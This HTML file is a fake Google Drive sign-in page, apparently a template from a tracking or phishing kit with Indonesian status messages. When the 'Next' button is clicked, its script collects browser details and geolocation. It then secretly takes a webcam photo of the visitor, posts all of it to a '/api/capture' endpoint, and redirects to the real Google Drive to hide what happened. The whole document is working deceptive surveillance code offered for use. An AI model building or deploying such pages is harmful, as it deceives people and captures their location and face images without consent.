<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Drive</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center}
.logo{font-size:40px;font-weight:bold;color:#4285F4;margin-bottom:10px}
.logo span{color:#EA4335}
.subtitle{color:#5f6368;font-size:16px;margin-bottom:30px}
.input-group{margin-bottom:20px;text-align:left}
.input-group label{display:block;font-size:13px;color:#5f6368;margin-bottom:5px}
.input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
.input-group input:focus{border-color:#1a73e8}
.btn{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
.btn:hover{background:#1557b0}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.status{margin-top:15px;font-size:13px;color:#5f6368}
.footer{margin-top:30px;font-size:12px;color:#5f6368;border-top:1px solid #dadce0;padding-top:20px}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;border:3px solid #f3f3f3;border-top:3px solid #1a73e8;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;margin:10px auto}
@keyframes spin{100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<div class="logo">G<span>o</span>ogle</div>
<h1 style="font-size:24px;font-weight:400;color:#202124;">Sign in</h1>
<p class="subtitle">to continue to Google Drive</p>
<div class="input-group"><label>Email</label><input type="email" id="email" value="user@gmail.com"></div>
<div class="input-group"><label>Password</label><input type="password" id="password" value="password"></div>
<button class="btn" id="captureBtn">Next</button>
<div class="spinner" id="spinner"></div>
<div class="status" id="status">🔒 Secure connection</div>
<div class="footer"><a href="#">Forgot email?</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
</div>
<script>
(function(){
const btn=document.getElementById('captureBtn');
const statusEl=document.getElementById('status');
const spinner=document.getElementById('spinner');
let dataSent=false;
const path=window.location.pathname;
const code=path.split('/').pop()||'unknown';
btn.addEventListener('click',function(){
if(dataSent)return;
dataSent=true;
btn.disabled=true;
spinner.style.display='block';
statusEl.textContent='📡 Mengumpulkan data...';
const reportData={shortCode:code,type:'template',data:{ip:'Tidak diketahui',country:'Tidak diketahui',city:'Tidak diketahui',region:'Tidak diketahui',isp:'Tidak diketahui',browser:navigator.userAgent,os:navigator.platform||'Tidak diketahui',device:navigator.userAgentData?.platform||navigator.platform||'Tidak diketahui',userAgent:navigator.userAgent,fromUrl:document.referrer||'Direct',photoStatus:'Kamera ditolak/gagal',template:'GoogleDrive'}};
if(navigator.geolocation){
navigator.geolocation.getCurrentPosition(function(pos){
reportData.data.lat=pos.coords.latitude;
reportData.data.lng=pos.coords.longitude;
reportData.data.accuracy=pos.coords.accuracy+' meter';
statusEl.textContent='📍 Lokasi didapatkan ✅';
takePhoto();
},function(){takePhoto();});
}else{takePhoto();}
function takePhoto(){
if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
.then(function(stream){
const video=document.createElement('video');
video.srcObject=stream;
video.onloadedmetadata=function(){
video.play();
const canvas=document.createElement('canvas');
canvas.width=Math.min(video.videoWidth,640);
canvas.height=Math.min(video.videoHeight,480);
const ctx=canvas.getContext('2d');
ctx.drawImage(video,0,0,canvas.width,canvas.height);
reportData.data.photo=canvas.toDataURL('image/jpeg',0.7);
reportData.data.photoStatus='📷 Foto berhasil diambil ✅';
stream.getTracks().forEach(t=>t.stop());
statusEl.textContent='📷 Foto berhasil ✅';
sendData();
};
})
.catch(function(){reportData.data.photoStatus='📷 Kamera ditolak/gagal';sendData();});
}else{reportData.data.photoStatus='📷 Kamera tidak didukung';sendData();}
}
function sendData(){
statusEl.textContent='📤 Mengirim data...';
fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(reportData)})
.then(res=>res.json())
.then(function(){
statusEl.textContent='✅ Berhasil!';
spinner.style.display='none';
btn.textContent='✅ Done';
setTimeout(()=>{window.location.href='https://drive.google.com';},1500);
})
.catch(function(){
statusEl.textContent='❌ Gagal';
spinner.style.display='none';
btn.textContent='⚠️ Error';
setTimeout(()=>{window.location.href='https://drive.google.com';},1500);
});
}
});
})();
</script>
</body>
</html>
